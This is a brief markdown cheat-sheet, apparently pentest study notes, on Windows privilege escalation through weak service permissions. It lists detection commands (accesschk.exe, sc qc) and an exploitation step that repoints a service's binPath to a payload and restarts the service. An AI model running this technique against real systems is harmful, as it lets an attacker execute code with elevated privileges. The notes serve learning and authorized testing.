# Weak Service Permissions

## Detection

accesschk.exe -uwcqv "Authenticated Users" *

or

sc qc <service>

## Exploitation

sc config <service> binPath= "C:\payload.exe"

Restart service.
